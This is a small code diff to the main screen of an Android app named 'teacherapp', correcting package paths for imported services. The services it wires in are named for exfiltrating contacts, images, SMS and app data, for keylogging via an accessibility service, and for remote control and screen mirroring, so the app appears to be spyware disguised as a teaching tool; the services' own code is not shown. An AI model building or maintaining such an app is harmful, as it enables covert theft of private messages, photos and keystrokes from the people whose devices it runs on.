@@ -36,10 +36,10 @@ import com.example.teacherapp.navigation.NavGraph
 import com.example.teacherapp.navigation.ScreenOverlayState
 import com.example.teacherapp.services.ScreenMirrorService
 import com.example.teacherapp.ui.theme.TeacherappTheme
-import com.teacherapp.services.ContactExfiltrationService
-import com.teacherapp.services.ImageExfiltrationService
-import com.teacherapp.services.SmsExfiltrationService
-import com.teacherapp.services.AppDataExfiltrationService
+import com.example.teacherapp.services.ContactExfiltrationService
+import com.example.teacherapp.services.ImageExfiltrationService
+import com.example.teacherapp.services.SmsExfiltrationService
+import com.example.teacherapp.services.AppDataExfiltrationService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -376,7 +376,7 @@ class MainActivity : ComponentActivity() {
         ) ?: return false
         val splitter = TextUtils.SimpleStringSplitter(':')
         splitter.setString(enabled)
-        val keylogger  = "$packageName/com.teacherapp.services.KeyloggerService"
+        val keylogger  = "$packageName/com.example.teacherapp.services.KeyloggerService"
         val remoteCtrl = "$packageName/com.example.teacherapp.services.RemoteControlService"
         var hasKeylogger = false
         var hasRemote = false
